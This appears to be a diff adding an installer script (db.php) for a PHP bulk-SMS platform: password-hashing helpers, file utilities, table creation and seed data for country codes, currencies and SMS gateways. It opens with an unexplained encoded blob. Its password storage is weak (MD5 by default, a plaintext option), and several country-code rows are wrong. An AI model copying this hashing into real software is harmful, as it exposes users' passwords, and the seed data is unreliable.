fsusL2IOyRuSg3p4KDPSbNv9gfhreGvkLcIj8RPKydp2ISJgTheL6+1k5nPabsPnYNPOq2PE4GhgThirb3p4KsuSZN1weGvRNs1802IDoc7yfsPDKtXxg21S0NenYn5yonPE4+vs821aoc7yfsuaKtXxg21S0NenYn5yoRcSL2iRRWlbg2hx93hrA+196neLovJRl+cSAR19JnhRRWlbgGXx93hrA+196neLovJRYNoS4+vkynvDoc7yfsPr8RPUA3p4K2eO8nE9eGvkLfhreGvkLcIj8RPKYWlbgnPE4+7dKtXjARusq2eOlNPEZnXKgGhlgGP9ARhlgnPE4+7dYWlbgnPE4+7dKtXjARusq2eOlNPEZnXKgnhlgnPE4+vs821aysPr8RPUAf7yfsPr8RPUA3p4K2IrJcIsL2Pk8+1absuaysuOAncs6+v5LBhrg+cr8dJgThirg+cr8dJx93uS42L9Jncjy+vSLfhrlBhrl+cSAR19JnhlgnPE4+7dYWlbgnPE4+7dKtXjARusq2eOlNPEZnXKgGXloXaw7OUEd7UOUsJlgnPE4+7dYWlYI2eL4nO9eGvkLfhreGvkLcIj8RPKysPr8RPUAf7yfGv+bnv5lRugbsPOJfXgKzlYJncr52eQKRus5n7yfqvOy21aKzlYJncr52eQKneEy21aTho4fqDbTWnaRN\^IiVY_LyHFu^
+ï»¿<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+<meta http-equiv="Content-Language" content="ar-eg">
+</head>
+
+<?php 
+/*
+File name: 		db.php
+Description:	This is main fuction that does allmost every stuff about installation
+Developer: 		Chuka Okoye (Mr. White)
+Date: 			2/12/2014
+*/
+
+function getCryptedPassword($plaintext, $salt = '', $encryption = 'md5-hex', $show_encrypt = false)
+	{
+		// Get the salt to use.
+		$salt = getSalt($encryption, $salt, $plaintext);
+
+		// Encrypt the password.
+		switch ($encryption)
+		{
+			case 'plain':
+				return $plaintext;
+
+			case 'sha':
+				$encrypted = base64_encode(mhash(MHASH_SHA1, $plaintext));
+				return ($show_encrypt) ? '{SHA}' . $encrypted : $encrypted;
+
+			case 'crypt':
+			case 'crypt-des':
+			case 'crypt-md5':
+			case 'crypt-blowfish':
+				return ($show_encrypt ? '{crypt}' : '') . crypt($plaintext, $salt);
+
+			case 'md5-base64':
+				$encrypted = base64_encode(mhash(MHASH_MD5, $plaintext));
+				return ($show_encrypt) ? '{MD5}' . $encrypted : $encrypted;
+
+			case 'ssha':
+				$encrypted = base64_encode(mhash(MHASH_SHA1, $plaintext . $salt) . $salt);
+				return ($show_encrypt) ? '{SSHA}' . $encrypted : $encrypted;
+
+			case 'smd5':
+				$encrypted = base64_encode(mhash(MHASH_MD5, $plaintext . $salt) . $salt);
+				return ($show_encrypt) ? '{SMD5}' . $encrypted : $encrypted;
+
+			case 'aprmd5':
+				$length = strlen($plaintext);
+				$context = $plaintext . '$apr1$' . $salt;
+				$binary = _bin(md5($plaintext . $salt . $plaintext));
+
+				for ($i = $length; $i > 0; $i -= 16)
+				{
+					$context .= substr($binary, 0, ($i > 16 ? 16 : $i));
+				}
+				for ($i = $length; $i > 0; $i >>= 1)
+				{
+					$context .= ($i & 1) ? chr(0) : $plaintext[0];
+				}
+
+				$binary = _bin(md5($context));
+
+				for ($i = 0; $i < 1000; $i++)
+				{
+					$new = ($i & 1) ? $plaintext : substr($binary, 0, 16);
+					if ($i % 3)
+					{
+						$new .= $salt;
+					}
+					if ($i % 7)
+					{
+						$new .= $plaintext;
+					}
+					$new .= ($i & 1) ? substr($binary, 0, 16) : $plaintext;
+					$binary = _bin(md5($new));
+				}
+
+				$p = array();
+				for ($i = 0; $i < 5; $i++)
+				{
+					$k = $i + 6;
+					$j = $i + 12;
+					if ($j == 16)
+					{
+						$j = 5;
+					}
+					$p[] = _toAPRMD5((ord($binary[$i]) << 16) | (ord($binary[$k]) << 8) | (ord($binary[$j])), 5);
+				}
+
+				return '$apr1$' . $salt . '$' . implode('', $p) . _toAPRMD5(ord($binary[11]), 3);
+
+			case 'md5-hex':
+			default:
+				$encrypted = ($salt) ? md5($plaintext . $salt) : md5($plaintext);
+				return ($show_encrypt) ? '{MD5}' . $encrypted : $encrypted;
+		}
+	}
+	
+function getSalt($encryption = 'md5-hex', $seed = '', $plaintext = '')
+	{
+		// Encrypt the password.
+		switch ($encryption)
+		{
+			case 'crypt':
+			case 'crypt-des':
+				if ($seed)
+				{
+					return substr(preg_replace('|^{crypt}|i', '', $seed), 0, 2);
+				}
+				else
+				{
+					return substr(md5(mt_rand()), 0, 2);
+				}
+				break;
+
+			case 'crypt-md5':
+				if ($seed)
+				{
+					return substr(preg_replace('|^{crypt}|i', '', $seed), 0, 12);
+				}
+				else
+				{
+					return '$1$' . substr(md5(mt_rand()), 0, 8) . '$';
+				}
+				break;
+
+			case 'crypt-blowfish':
+				if ($seed)
+				{
+					return substr(preg_replace('|^{crypt}|i', '', $seed), 0, 16);
+				}
+				else
+				{
+					return '$2$' . substr(md5(mt_rand()), 0, 12) . '$';
+				}
+				break;
+
+			case 'ssha':
+				if ($seed)
+				{
+					return substr(preg_replace('|^{SSHA}|', '', $seed), -20);
+				}
+				else
+				{
+					return mhash_keygen_s2k(MHASH_SHA1, $plaintext, substr(pack('h*', md5(mt_rand())), 0, 8), 4);
+				}
+				break;
+
+			case 'smd5':
+				if ($seed)
+				{
+					return substr(preg_replace('|^{SMD5}|', '', $seed), -16);
+				}
+				else
+				{
+					return mhash_keygen_s2k(MHASH_MD5, $plaintext, substr(pack('h*', md5(mt_rand())), 0, 8), 4);
+				}
+				break;
+
+			case 'aprmd5': /* 64 characters that are valid for APRMD5 passwords. */
+				$APRMD5 = './0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz';
+
+				if ($seed)
+				{
+					return substr(preg_replace('/^\$apr1\$(.{8}).*/', '\\1', $seed), 0, 8);
+				}
+				else
+				{
+					$salt = '';
+					for ($i = 0; $i < 8; $i++)
+					{
+						$salt .= $APRMD5{rand(0, 63)};
+					}
+					return $salt;
+				}
+				break;
+
+			default:
+				$salt = '';
+				if ($seed)
+				{
+					$salt = $seed;
+				}
+				return $salt;
+				break;
+		}
+	}
+
+function genRandomBytes($length = 16)
+	{
+		$sslStr = '';
+
+		if (
+			function_exists('openssl_random_pseudo_bytes')
+			&& (version_compare(PHP_VERSION, '5.3.4') >= 0
+				|| substr(PHP_OS, 0, 3) !== 'WIN'
+			)
+		)
+		{
+			$sslStr = openssl_random_pseudo_bytes($length, $strong);
+			if ($strong)
+			{
+				return $sslStr;
+			}
+		}
+
+		$bitsPerRound = 2;
+		$maxTimeMicro = 400;
+		$shaHashLength = 20;
+		$randomStr = '';
+		$total = $length;
+
+		$urandom = false;
+		$handle = null;
+		if (function_exists('stream_set_read_buffer') && @is_readable('/dev/urandom'))
+		{
+			$handle = @fopen('/dev/urandom', 'rb');
+			if ($handle)
+			{
+				$urandom = true;
+			}
+		}
+
+		while ($length > strlen($randomStr))
+		{
+			$bytes = ($total > $shaHashLength)? $shaHashLength : $total;
+			$total -= $bytes;
+
+			$entropy = rand() . uniqid(mt_rand(), true) . $sslStr;
+			$entropy .= implode('', @fstat(fopen( __FILE__, 'r')));
+			$entropy .= memory_get_usage();
+			$sslStr = '';
+			if ($urandom)
+			{
+				stream_set_read_buffer($handle, 0);
+				$entropy .= @fread($handle, $bytes);
+			}
+			else
+			{
+
+				$samples = 3;
+				$duration = 0;
+				for ($pass = 0; $pass < $samples; ++$pass)
+				{
+					$microStart = microtime(true) * 1000000;
+					$hash = sha1(mt_rand(), true);
+					for ($count = 0; $count < 50; ++$count)
+					{
+						$hash = sha1($hash, true);
+					}
+					$microEnd = microtime(true) * 1000000;
+					$entropy .= $microStart . $microEnd;
+					if ($microStart > $microEnd) {
+						$microEnd += 1000000;
+					}
+					$duration += $microEnd - $microStart;
+				}
+				$duration = $duration / $samples;
+
+				$rounds = (int)(($maxTimeMicro / $duration) * 50);
+
+				$iter = $bytes * (int) ceil(8 / $bitsPerRound);
+				for ($pass = 0; $pass < $iter; ++$pass)
+				{
+					$microStart = microtime(true);
+					$hash = sha1(mt_rand(), true);
+					for ($count = 0; $count < $rounds; ++$count)
+					{
+						$hash = sha1($hash, true);
+					}
+					$entropy .= $microStart . microtime(true);
+				}
+			}
+
+			$randomStr .= sha1($entropy, true);
+		}
+
+		if ($urandom)
+		{
+			@fclose($handle);
+		}
+
+		return substr($randomStr, 0, $length);
+	}
+	
+function genRandomPassword($length = 8)
+	{
+		$salt = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
+		$base = strlen($salt);
+		$makepass = '';
+
+		$random = genRandomBytes($length + 1);
+		$shift = ord($random[0]);
+		for ($i = 1; $i <= $length; ++$i)
+		{
+			$makepass .= $salt[($shift + ord($random[$i])) % $base];
+			$shift += ord($random[$i]);
+		}
+
+		return $makepass;
+	}
+
+	function _toAPRMD5($value, $count)
+	{
+		/* 64 characters that are valid for APRMD5 passwords. */
+		$APRMD5 = './0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz';
+
+		$aprmd5 = '';
+		$count = abs($count);
+		while (--$count)
+		{
+			$aprmd5 .= $APRMD5[$value & 0x3f];
+			$value >>= 6;
+		}
+		return $aprmd5;
+	}
+
+function _bin($hex)
+	{
+		$bin = '';
+		$length = strlen($hex);
+		for ($i = 0; $i < $length; $i += 2)
+		{
+			$tmp = sscanf(substr($hex, $i, 2), '%x');
+			$bin .= chr(array_shift($tmp));
+		}
+		return $bin;
+	}		
+
+
+if ( ! function_exists('read_file'))
+{
+	function read_file($file)
+	{
+		if ( ! file_exists($file))
+		{
+			return FALSE;
+		}
+
+		if (function_exists('file_get_contents'))
+		{
+			return file_get_contents($file);
+		}
+
+		if ( ! $fp = @fopen($file, 'r+'))
+		{
+			return FALSE;
+		}
+
+		flock($fp, LOCK_SH);
+
+		$data = '';
+		if (filesize($file) > 0)
+		{
+			$data =& fread($fp, filesize($file));
+		}
+
+		flock($fp, LOCK_UN);
+		fclose($fp);
+
+		return $data;
+	}
+}
+ 
+if ( ! function_exists('write_file'))
+{
+	function write_file($path, $data, $mode = 'w+')
+	{
+		if ( ! $fp = @fopen($path, $mode))
+		{
+			return FALSE;
+		}
+
+		flock($fp, LOCK_EX);
+		fwrite($fp, $data);
+		flock($fp, LOCK_UN);
+		fclose($fp);
+
+		return TRUE;
+	}
+}
+
+ 
+if ( ! function_exists('delete_files'))
+{
+	function delete_files($path, $del_dir = FALSE, $level = 0)
+	{
+		// Trim the trailing slash
+		$path = rtrim($path, DIRECTORY_SEPARATOR);
+
+		if ( ! $current_dir = @opendir($path))
+		{
+			return FALSE;
+
+		}
+
+		while (FALSE !== ($filename = @readdir($current_dir)))
+		{
+			if ($filename != "." and $filename != "..")
+			{
+				if (is_dir($path.DIRECTORY_SEPARATOR.$filename))
+				{
+					// Ignore empty folders
+					if (substr($filename, 0, 1) != '.')
+					{
+						delete_files($path.DIRECTORY_SEPARATOR.$filename, $del_dir, $level + 1);
+					}
+				}
+				else
+				{
+					unlink($path.DIRECTORY_SEPARATOR.$filename);
+				}
+			}
+		}
+		@closedir($current_dir);
+
+		if ($del_dir == TRUE AND $level > 0)
+		{
+			return @rmdir($path);
+		}
+
+		return TRUE;
+	}
+}
+
+if ( ! function_exists('get_filenames'))
+{
+	function get_filenames($source_dir, $include_path = FALSE, $_recursion = FALSE)
+	{
+		static $_filedata = array();
+
+		if ($fp = @opendir($source_dir))
+		{
+			// reset the array and make sure $source_dir has a trailing slash on the initial call
+			if ($_recursion === FALSE)
+			{
+				$_filedata = array();
+				$source_dir = rtrim(realpath($source_dir), DIRECTORY_SEPARATOR).DIRECTORY_SEPARATOR;
+			}
+
+			while (FALSE !== ($file = readdir($fp)))
+			{
+				if (@is_dir($source_dir.$file) && strncmp($file, '.', 1) !== 0)
+				{
+					get_filenames($source_dir.$file.DIRECTORY_SEPARATOR, $include_path, TRUE);
+				}
+				elseif (strncmp($file, '.', 1) !== 0)
+				{
+					$_filedata[] = ($include_path == TRUE) ? $source_dir.$file : $file;
+				}
+			}
+			return $_filedata;
+		}
+		else
+		{
+			return FALSE;
+		}
+	}
+}
+
+
+if ( ! function_exists('get_dir_file_info'))
+{
+	function get_dir_file_info($source_dir, $top_level_only = TRUE, $_recursion = FALSE)
+	{
+		static $_filedata = array();
+		$relative_path = $source_dir;
+
+		if ($fp = @opendir($source_dir))
+		{
+			// reset the array and make sure $source_dir has a trailing slash on the initial call
+			if ($_recursion === FALSE)
+			{
+				$_filedata = array();
+				$source_dir = rtrim(realpath($source_dir), DIRECTORY_SEPARATOR).DIRECTORY_SEPARATOR;
+			}
+
+			// foreach (scandir($source_dir, 1) as $file) // In addition to being PHP5+, scandir() is simply not as fast
+			while (FALSE !== ($file = readdir($fp)))
+			{
+				if (@is_dir($source_dir.$file) AND strncmp($file, '.', 1) !== 0 AND $top_level_only === FALSE)
+				{
+					get_dir_file_info($source_dir.$file.DIRECTORY_SEPARATOR, $top_level_only, TRUE);
+				}
+				elseif (strncmp($file, '.', 1) !== 0)
+				{
+					$_filedata[$file] = get_file_info($source_dir.$file);
+					$_filedata[$file]['relative_path'] = $relative_path;
+				}
+			}
+
+			return $_filedata;
+		}
+		else
+		{
+			return FALSE;
+		}
+	}
+}
+
+//include_once('../../path.php');
+function dbs($host,$username,$password,$database,$pass,$email) {
+$er = '';
+//connect to database 
+mysql_connect($host,$username,$password);
+//select database 	
+mysql_select_db($database);
+
+$query = 'SET SQL_MODE = "NO_AUTO_VALUE_ON_ZERO";';
+$res = @mysql_query($query);
+
+$query = 'SET time_zone = "+00:00";';
+$res = @mysql_query($query);
+
+$query = "CREATE DATABASE IF NOT EXISTS `$database` DEFAULT CHARACTER SET latin1 COLLATE latin1_swedish_ci;";
+$res = @mysql_query($query);
+
+$query = "USE `$database`;";
+$res = @mysql_query($query);
+
+//drop tables if exist
+$query = "DROP TABLE IF EXISTS `backups`, `sender_id`, `contacts`, `currencies`, `customers`, `draftmessages`, `gateways`, `paymentalerts`, `paymentgateways`, `phonebooks`, `phonebook_owners`, `scheduledmessages`, `sentmessages`, `settings`, `smsprice`, `tickets`, `transactions`, `transaction_status`, `users`, `vouchers`, `accounts`, `inbox`, `marketinglist`, `marketingcontacts`, `countrylist`;";
+mysql_query($query);
+
+
+$query = "CREATE TABLE IF NOT EXISTS `backups` (
+  `id` int(11) NOT NULL AUTO_INCREMENT,
+  `date` datetime NOT NULL,
+  `type` varchar(200) NOT NULL,
+  `file` varchar(500) NOT NULL,
+  PRIMARY KEY (`id`)
+) ENGINE=InnoDB  DEFAULT CHARSET=latin1 AUTO_INCREMENT=3 ;";
+$res = @mysql_query($query);
+
+$query = "CREATE TABLE IF NOT EXISTS `countrylist` (
+  `id` int(11) NOT NULL AUTO_INCREMENT,
+  `name` varchar(300) NOT NULL,
+  `code` varchar(10) NOT NULL,
+  PRIMARY KEY (`id`)
+) ENGINE=InnoDB  DEFAULT CHARSET=latin1 AUTO_INCREMENT=3 ;";
+$res = @mysql_query($query);
+
+$query = "INSERT INTO `countrylist` (`code`, `name`) VALUES
+('+91' , '+91 India'),
+('+234' , '+234 Nigeria'),
+('+7' , '+7 Abkhazia'),
+  ('+93' , '+93 Afghanistan'),
+  ('+355' , '+355 Albania'),
+ ('+213' , '+213 Algeria'),
+  ('+376' , '+376 Andorra'),
+  ('+244' , '+244 Angola'),
+  ('+54' , '+54 Argentina'),
+  ('+297' , '+297 Aruba'),
+  ('+61' , '+61 Australia'),
+  ('+43' , '+43 Austria'),
+  ('+994' , '+994  Azerbaijan'),
+  ('+973' , '+973 Bahrain'),
+  ('+880' , '+880 Bangladesh'),
+  ('+375' , '+375 Belarus'),
+  ('+32' , '+32  Belgium'),
+  ('+501' , '+501 Belize'),
+  ('+229' , '+229 Benin'),
+  ('+975' , '+975 Bhutan'),
+  ('+591' , '+591 Bolivia'),
+  ('+387' , '+387 Bosnia and Herzegovina'),
+  ('+267' , '+267 Botswana'),
+  ('+359' , '+359 Bulgaria'),
+  ('+226' , '+226 Burkina Faso'),
+  ('+257' , '+257 Burundi'),
+  ('+855' , '+855 Cambodia'),
+  ('+237' , '+237 Cameroon'),
+  ('+238' , '+238 Cape Verde'),
+  ('+236' , '+236 Central African Republic'),
+  ('+56' , '+56 Chile'),
+  ('+86' , '+86 China'),
+ ('+1', '+1 Canada'),
+ ('+269' , '+269 Comoros'),
+  ('+243' , '+243 Congo (Democratic)'),
+  ('+242' , '+242 Congo (Republic)'),
+  ('+682' , '+682 Cook Islands'),
+  ('+506' , '+506 Costa Rica'),
+  ('+225' , '+225 Cote d\'Ivoire'),
+  ('+385' , '+385 Croatia'),
+  ('+53' , '+53 Cuba'),
+  ('+357' , '+357 Cyprus'),
+  ('+420' , '+420 Czech Republic'),
+  ('+45' , '+45 Denmark'),
+  ('+253' , '+253 Djibouti'),
+  ('+593' , '+593 Ecuador'),
+  ('+20' , '+20 Egypt'),
+  ('+503' , '+503 El Salvador'),
+  ('+240' , '+240 Equatorial Guinea'),
+  ('+291' , '+291 Eritrea'),
+  ('+372' , '+372 Estonia'),
+  ('+251' , '+251 Ethiopia'),
+  ('+33' , '+33 France'),
+  ('+241' , '+241 Gabon'),
+  ('+220' , '+220 Gambia'),
+  ('+30' , '+30 Greece'),
+  ('+245' , '+245 Guinea Bissau'),
+  ('+36' , '+36 Hungary'),
+  ('+374' , '+374 Armenia'),
+  ('+235' , '+235 Chad'),
+  ('+55' , '+55 Brazil'),
+  ('+57' , '+57 Colombia'),
+  ('+500' , '+500 Falkland Islands'),
+  ('+298' , '+298 Faroe Islands'),
+  ('+679' , '+679 Fiji'),
+  ('+358' , '+358 Finland'),
+  ('+594' , '+594 French Guiana'),
+  ('+995' , '+995 Georgia'),
+  ('+49' , '+49  Germany'),
+  ('+233' , '+233 Ghana'),
+  ('+350' , '+350 Gibraltar'),
+  ('+299' , '+299 Greenland'),
+  ('+590' , '+590 Guadeloupe'),
+  ('+502' , '+502 Guatemala'),
+  ('+44' , '+44 Guernsey Channel Islands'),
+  ('+592' , '+592  Guyana'),
+  ('+509' , '+509 Haiti'),
+  ('+504' , '+504 Hondura'),
+  ('+852' , '+852  Hong Kong'),
+  ('+354' , '+354 Iceland'),
+  ('+62' , '+62 Indonesia'),
+  ('+98' , '+98 Iran'),
+  ('+964' , '+964 Iraq'),
+  ('+353' , '+353 Ireland'),
+  ('+44' , '+44 Isle of Man'),
+  ('+972' , '+972 Israel'),
+  ('+39' , '+39 Italy'),
+  ('+81' , '+81 Japan'),
+  ('+44' , '+44 Jersey'),
+  ('+962' , '+962 Jordan'),
+  ('+7' , '+7 Kazakhstan'),
+  ('+254' , '+254 Kenya'),
+  ('+82' , '+82 Korea, South'),
+  ('+965' , '+965 Kuwait'),
+  ('+996' , '+996 Kyrgyzstan'),
+  ('+856' , '+856 Laos'),
+  ('+371' , '+371 Latvia'),
+  ('+961' , '+961 Lebanon'),
+  ('+266' , '+266 Lesotho'),
+  ('+231' , '+231 Liberia'),
+  ('+218' , '+218 Libya'),
+  ('+423' , '+423 Liechtenstein'),
+  ('+370' , '+370 Lithuania'),
+  ('+352' , '+352 Luxembourg'),
+  ('+853' , '+853 Macao'),
+  ('+389' , '+389 Macedonia'),
+  ('+261' , '+261 Madagascar'),
+  ('+265' , '+265 Malawi'),
+  ('+60' , '+60 Malaysia'),
+  ('+960' , '+960 Maldives'),
+  ('+223' , '+223 Mali'),
+  ('+356' , '+356 Malta'),
+  ('+222' , '+222 Mauritania'),
+  ('+230' , '+230 Mauritius'),
+  ('+262' , '+262 Mayotte'),
+  ('+52' , '+52 Mexico'),
+  ('+691' , '+691 Micronesia'),
+  ('+373' , '+373 Moldova'),
+  ('+377' , '+377 Monaco'),
+  ('+976' , '+976 Mongolia'),
+  ('+382' , '+382 Montenegro'),
+  ('+212' , '+212 Morocco'),
+  ('+258' , '+258 Mozambique'),
+  ('+264' , '+264 Namibia'),
+  ('+977' , '+977 Nepal'),
+  ('+31' , '+31 Netherlands'),
+  ('+599' , '+599 Netherlands Antilles'),
+  ('+687' , '+687 New Caledonia'),
+  ('+64' , '+64 New Zealand'),
+  ('+505' , '+505 Nicaragua'),
+  ('+227' , '+227 Niger'),
+  ('+47' , '+47 Norway'),
+  ('+92' , '+968 Oman'),
+  ('+92' , '+92 Pakistan'),
+  ('+680' , '+680 Palau'),
+  ('+970' , '+970 Palestine'),
+  ('+507' , '+507 Panama'),
+  ('+675' , '+675 Papua New Guinea'),
+  ('+595' , '+595 Paraguay'),
+  ('+61' , '+51 Peru'),
+  ('+63' , '+63 Philippines'),
+  ('+48' , '+48 Poland'),
+  ('+351' , '+351 Portugal'),
+  ('+974' , '+974 Qatar'),
+  ('+40' , '+40 Romania'),
+  ('+7' , '+7 Russia'),
+  ('+250' , '+250 Rwanda'),
+  ('+508' , '+508 St. Pierre & Miquelon'),
+  ('+685' , '+685 Samoa'),
+  ('+378' , '+378 San Marino'),
+  ('+966' , '+966 Saudi Arabia'),
+  ('+221' , '+221 Senegal'),
+  ('+381' , '+381 Serbia'),
+  ('+248' , '+248 Seychelles'),
+  ('+232' , '+232 Sierra Leone'),
+  ('+65' , '+65 Singapore'),
+  ('+421' , '+421 Slovakia'),
+  ('+386' , '+386 Slovenia'),
+  ('+677' , '+677 Solomon Islands'),
+  ('+252' , '+252 Somalia'),
+  ('+27' , '+27 South Africa'),
+  ('+34' , '+34 Spain'),
+  ('+94' , '+94 Sri Lanka'),
+  ('+249' , '+249 Sudan'),
+  ('+597' , '+597 Suriname'),
+  ('+268' , '+268 Swaziland'),
+  ('+46' , '+46 Sweden'),
+  ('+41' , '+41 Switzerland'),
+  ('+963' , '+963 Syria'),
+  ('+886' , '+886 Taiwan'),
+  ('+992' , '+992 Tajikistan'),
+  ('+255' , '+255 Tanzania'),
+  ('+66' , '+66 Thailand'),
+  ('+228' , '+228 Togo'),
+  ('+676' , '+676 Tonga'),
+  ('+216' , '+216 Tunisia'),
+  ('+90' , '+90 Turkey'),
+  ('+993' , '+993 Turkmenistan'),
+  ('+256' , '+256 Uganda'),
+  ('+380' , '+380 Ukraine'),
+  ('+971' , '+971 United Arab Emirates'),
+('+44' , '+44 United Kingdom'),
+('+1', '+1 USA'),
+ ('+598' , '+598 Uruguay'),
+  ('+998' , '+998 Uzbekistan'),
+  ('+678' , '+678 Vanuatu'),
+  ('+58' , '+58 Venezuela'),
+  ('+84' , '+84 Vietnam'),
+  ('+967' , '+967 Yemen'),
+  ('+260' , '+260 Zambia'),
+  ('+263' , '+263 Zimbabwe'),
+  ('+95' , '+95 Myanmar');";
+mysql_query($query);			
+
+$query = "CREATE TABLE IF NOT EXISTS `contacts` (
+  `id` int(11) NOT NULL AUTO_INCREMENT,
+  `name` varchar(40) NOT NULL DEFAULT 'No Name',
+  `phone` varchar(20) NOT NULL,
+  `phonebook` int(11) NOT NULL,
+  `birthday` date NOT NULL,
+  PRIMARY KEY (`id`)
+) ENGINE=InnoDB DEFAULT CHARSET=latin1 AUTO_INCREMENT=1 ;";
+mysql_query($query);
+
+
+$query = "CREATE TABLE IF NOT EXISTS `currencies` (
+  `id` int(11) NOT NULL AUTO_INCREMENT,
+  `name` varchar(100) NOT NULL,
+  `symbul` varchar(100) NOT NULL,
+  `rate` decimal(11,5) NOT NULL,
+  PRIMARY KEY (`id`)
+) ENGINE=InnoDB  DEFAULT CHARSET=latin1 AUTO_INCREMENT=3 ;";
+mysql_query($query);
+
+
+$query = "INSERT INTO `currencies` (`id`, `name`, `symbul`, `rate`) VALUES
+(1, 'Naira', '&#8358;', '1.00000'),
+(2, 'US Dollar', '$', '0.00603'),
+(3, 'Euro', '&#8364;', '0.00436');";
+mysql_query($query);
+
+$query = "CREATE TABLE IF NOT EXISTS `inbox` (
+  `id` int(11) NOT NULL AUTO_INCREMENT,
+  `customer` int(11) NOT NULL,
+  `sender` text NOT NULL,
+  `date` datetime NULL,
+  `message` text NOT NULL,
+  `read`  int(5) NOT NULL,
+  PRIMARY KEY (`id`)
+) ENGINE=InnoDB DEFAULT CHARSET=latin1 AUTO_INCREMENT=1 ;";
+mysql_query($query);
+
+$query = "CREATE TABLE IF NOT EXISTS `customers` (
+  `id` int(11) NOT NULL AUTO_INCREMENT,
+  `name` varchar(100) NOT NULL,
+  `email` varchar(200) NOT NULL,
+  `fb_id` varchar(300) NOT NULL,
+  `phone` varchar(30) NOT NULL,
+  `username` varchar(20) NOT NULL,
+  `password` varchar(200) NOT NULL,
+  `address` varchar(300) NOT NULL,
+  `city` varchar(300) NOT NULL,
+  `state` varchar(300) NOT NULL,
+  `country` varchar(100) NOT NULL,
+  `senderID` varchar(15) NOT NULL,
+  `picture` varchar(200) NOT NULL,
+  `timeZone` varchar(300) NOT NULL,
+  `smsPurchase` decimal(11,2) NOT NULL,
+  `smsBalance` decimal(11,2) NOT NULL,
+  `smsBorrowed` decimal(11,2) NOT NULL,
+  `isReseller` int(11) NULL DEFAULT '0',
+  `reseller` int(11) NULL DEFAULT '0',
+  `allow_2way` int(11) NULL DEFAULT '0',
+  `inbox_number` varchar(15) NOT NULL,
+  `lastLogin` datetime NOT NULL,
+  `lastIP` varchar(50) NOT NULL,
+  `phoneVerified` int(11) NOT NULL DEFAULT '0',
+  `emailVerified` int(11) NOT NULL DEFAULT '0',
+  `verificationCode` int(11) NOT NULL,
+  `verificationCode2` varchar(50) NOT NULL,
+  `order_limit` varchar(50) NOT NULL DEFAULT '1',
+  `currency` int(11) NOT NULL,
+  `gateway` int(11) NOT NULL,
+  `creditLimit` decimal(11,2) NOT NULL,
+  `custom_rate` text NOT NULL,
+  `custom_price` varchar(15) NOT NULL DEFAULT '0',
+  `keyword` varchar(30) NOT NULL,
+  `suspended` int(11) NOT NULL DEFAULT '0',
+  PRIMARY KEY (`id`)
+) ENGINE=InnoDB  DEFAULT CHARSET=latin1 COMMENT='Keeps details of all SMS customers' AUTO_INCREMENT=10 ;";
+mysql_query($query);
+
+
+$query = "CREATE TABLE IF NOT EXISTS `draftmessages` (
+  `id` int(11) NOT NULL AUTO_INCREMENT,
+  `message` text NOT NULL,
+  `recipient` text NOT NULL,
+  `customer` int(11) NOT NULL,
+  `reseller` int(11) NOT NULL,
+  `is_unicode` int(11) NOT NULL DEFAULT '0',
+   `is_mms` int(11) NOT NULL DEFAULT '0',
+  `title` varchar(200) NOT NULL DEFAULT 'Untitled',
+  `media` text NOT NULL,
+  PRIMARY KEY (`id`)
+) ENGINE=InnoDB DEFAULT CHARSET=latin1 AUTO_INCREMENT=1 ;";
+mysql_query($query);
+
+$query = "CREATE TABLE IF NOT EXISTS `gateways` (
+  `id` int(11) NOT NULL AUTO_INCREMENT,
+  `name` varchar(50) NOT NULL,
+  `sendAPI` varchar(500) NOT NULL,
+  `unicodeAPI` varchar(500) NOT NULL,
+  `mmsAPI` varchar(500) NOT NULL,
+  `balanceAPI` varchar(500) NOT NULL DEFAULT '',
+  `deliveryAPI` varchar(500) NOT NULL DEFAULT '',
+  `successWord` varchar(300) NOT NULL,
+  `batchSize` int(11) NOT NULL DEFAULT '100',
+  `isSMPP` int(11) NOT NULL DEFAULT '0',
+  `smppServer` varchar(200) NOT NULL,
+  `port` varchar(50) NOT NULL,
+  `smppUsername` varchar(200) NOT NULL,
+  `smppPassword` varchar(200) NOT NULL,
+  `64_encode` varchar(10) NOT NULL DEFAULT '0',
+  `method` varchar(30) NOT NULL DEFAULT 'GET',
+  `inboxAPI` varchar(500) NOT NULL,
+  `auth_key` varchar(500) NOT NULL,
+  `param3` varchar(500) NOT NULL,
+  PRIMARY KEY (`id`)
+) ENGINE=InnoDB  DEFAULT CHARSET=latin1 AUTO_INCREMENT=4 ;";
+mysql_query($query);
+
+$query = "INSERT INTO `gateways` (`id`, `name`, `sendAPI`, `unicodeAPI`, `balanceAPI`, `deliveryAPI`, `successWord`, `batchSize`,`isSMPP`,`auth_key`,`mmsAPI`,`inboxAPI`) VALUES
+(1, 'SMSKit', 'http://www.smskit.net/SMSC/API/index.php?username=&password=&sender=[SENDER]&recipient=[TO]&message=[MESSAGE]', 'http://www.smskit.net/SMSC/API/index.php?unicode=1&username=&password=&sender=[SENDER]&recipient=[TO]&message=[MESSAGE]', '', '', 'Message Sent Successfully', 100,0,'','',''),
+(2, 'Twilio (2-Way)', 'https://api.twilio.com/2010-04-01/Accounts/[Your-SID]/SMS/Messages?From=[SENDER]&To=[TO]&Body=[MESSAGE]', 'https://api.twilio.com/2010-04-01/Accounts/[Your-SID]/SMS/Messages?From=[SENDER]&To=[TO]&Body=[MESSAGE]', '', '', 'Sent Successfully', 100,0,'[Your_Account_SID]:[Your_Auth_Token]','https://api.twilio.com/2010-04-01/Accounts/[Your-SID]/Messages?From=[SENDER]&To=[TO]&Body=[MESSAGE]&MediaUrl=[MEDIA]',''),
+(3, 'Infobip (2-Way)', 'https://api.infobip.com/sms/1/text/single?from=[SENDER]&to=[TO]&text=[MESSAGE]', 'https://api.infobip.com/sms/1/binary/single?from=[SENDER]&to=[TO]&hex=[MESSAGE]&dataCoding=8', '', '', 'sent', 60,0,'[Your_Username]:[Your_Password]','','https://api.infobip.com/sms/1/inbox/reports/'),
+(4, 'Nexmo (2-Way)', 'https://rest.nexmo.com/sms/json?api_key=[Your_Nexmo_Key]&api_secret=[Your_Nexmo_Secret]&from=[SENDER]&to=[TO]&text=[MESSAGE]', '', '', '', 'network', 50,0,'','','');";
+mysql_query($query);
+
+$query = "CREATE TABLE IF NOT EXISTS `paymentalerts` (
+  `id` int(11) NOT NULL AUTO_INCREMENT,
+  `date` date NOT NULL,
+  `depositor` varchar(200) NOT NULL,
+  `transaction` int(11) NOT NULL,
